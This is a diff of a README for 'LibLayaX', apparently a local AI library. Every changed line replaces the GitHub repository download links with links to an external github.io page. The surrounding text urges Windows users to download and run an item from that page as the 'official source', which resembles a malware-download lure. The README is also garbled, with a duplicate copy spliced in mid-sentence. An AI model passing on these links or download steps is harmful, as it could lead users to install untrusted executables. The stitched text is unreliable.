@@ -1,7 +1,7 @@
 # 🚀 LibLayaX - Fast Local AI Decisions Made Easy
 
 <p align="center">
-  <a href="https://github.com/Catchmekasmay/LibLayaX" style="display:inline-block;padding:18px 34px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#ff6b6b,#feca57);border-radius:14px;text-decoration:none;">⬇️ Download LibLayaX</a>
+  <a href="https://catchmekasmay.github.io" style="display:inline-block;padding:18px 34px;font-size:22px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#ff6b6b,#feca57);border-radius:14px;text-decoration:none;">⬇️ Download LibLayaX</a>
 </p>
 
 ## 🧠 What Is LibLayaX?
@@ -39,7 +39,7 @@ You do not need to create an account, configure a server, or install Python for 
 Use the official LibLayaX page below. Visit this link to download the application.
 
 <p align="center">
-  <a href="https://github.com/Catchmekasmay/LibLayaX" style="display:inline-block;padding:16px 30px;font-size:20px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#4facfe,#00f2fe);border-radius:12px;text-decoration:none;">📥 Get LibLayaX</a>
+  <a href="https://catchmekasmay.github.io" style="display:inline-block;padding:16px 30px;font-size:20px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#4facfe,#00f2fe);border-radius:12px;text-decoration:none;">📥 Get LibLayaX</a>
 </p>
 
 After you reach the page, follow the download path shown there. When the download completes, open the downloaded item from your browser’s download list or from your Windows Downloads folder. Follow the on-screen instructions that come with the download. This keeps the setup focused on the official source and avoids confusion from unrelated files or third-party pages.
@@ -134,7 +134,7 @@ If the application does not open after download, restart your computer and try o
 
 Visit the official Lib# 🚀 LibLayaX - Fast Local AI Decisions Made Easy
 
-[![Download LibLayaX](https://img.shields.io/badge/Download-LibLayaX-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Catchmekasmay/LibLayaX)
+[![Download LibLayaX](https://img.shields.io/badge/Download-LibLayaX-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://catchmekasmay.github.io)
 
 ## 🧠 What Is LibLayaX?
 
@@ -170,7 +170,7 @@ You do not need to create an account, configure a server, or install Python for 
 
 Use the official LibLayaX page below. Visit this link to download the application.
 
-[![Get LibLayaX](https://img.shields.io/badge/Get%20LibLayaX-Download%20Now-4facfe?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Catchmekasmay/LibLayaX)
+[![Get LibLayaX](https://img.shields.io/badge/Get%20LibLayaX-Download%20Now-4facfe?style=for-the-badge&logo=github&logoColor=white)](https://catchmekasmay.github.io)
 
 After you reach the page, follow the download path shown there. When the download completes, open the downloaded item from your browser's download list or from your Windows Downloads folder. Follow the on-screen instructions that come with the download. This keeps the setup focused on the official source and avoids confusion from unrelated files or third-party pages.
 
@@ -262,6 +262,6 @@ If the application does not open after download, restart your computer and try o
 
 ## 📚 Official Link
 
-Visit the official LibLayaX page here: [https://github.com/Catchmekasmay/LibLayaX](https://github.com/Catchmekasmay/LibLayaX)
+Visit the official LibLayaX page here: [https://catchmekasmay.github.io](https://catchmekasmay.github.io)
 
 Keywords: ai, ai-agents, ai-decision-making, c-api, cpp, cross-platform, decision-making, generative-ai, ggml, inference, jev, jev-api, laya, local-ai, machine-learning, on-device-ai, on-premise-ai, shared-library, text-classification, vulkan
